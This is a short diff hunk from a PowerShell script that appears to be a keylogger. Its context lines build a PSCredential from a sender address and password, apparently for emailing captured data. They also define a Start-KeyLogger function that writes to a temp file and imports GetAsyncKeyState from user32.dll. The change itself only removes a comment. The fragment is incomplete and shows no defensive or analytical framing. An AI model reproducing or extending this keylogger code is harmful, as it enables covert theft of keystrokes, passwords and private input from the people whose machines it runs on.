@@ -11,7 +11,6 @@ $credentials = new-object Management.Automation.PSCredential $From, ($Pass | Con
 
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
 {
-  # Signatures for API Calls
   $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
